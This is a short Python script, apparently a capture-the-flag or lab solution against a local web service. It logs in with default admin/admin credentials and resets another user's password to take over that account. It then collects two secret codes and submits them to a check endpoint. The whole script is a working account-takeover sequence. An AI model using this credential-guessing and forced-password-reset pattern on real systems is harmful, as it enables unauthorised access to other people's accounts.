import requests as re
import json


s = re.session()
s.post("http://127.0.0.1:8000/login", json={"username":"user2", "password":"user2"})
r = s.get("http://127.0.0.1:8000/secret_code")
primo_codice = json.loads(r.content)["secret_code"]
print(f"primo_codice: {primo_codice}")
s.close()

s = re.session()
s.post("http://127.0.0.1:8000/login", json={"username":"admin", "password":"admin"})
s.post("http://127.0.0.1:8000/change_password", json={"username":"user", "new_password":"user"})
s.close()
s = re.session()
s.post("http://127.0.0.1:8000/login", json={"username":"user", "password":"user"})
r = s.get("http://127.0.0.1:8000/secret_code")
secondo_codice = json.loads(r.content)["secret_code"]
print(f"secondo_codice: {secondo_codice}")
s.close()

r = re.post("http://127.0.0.1:8000/check", json={"code":secondo_codice+primo_codice})
print(r.content)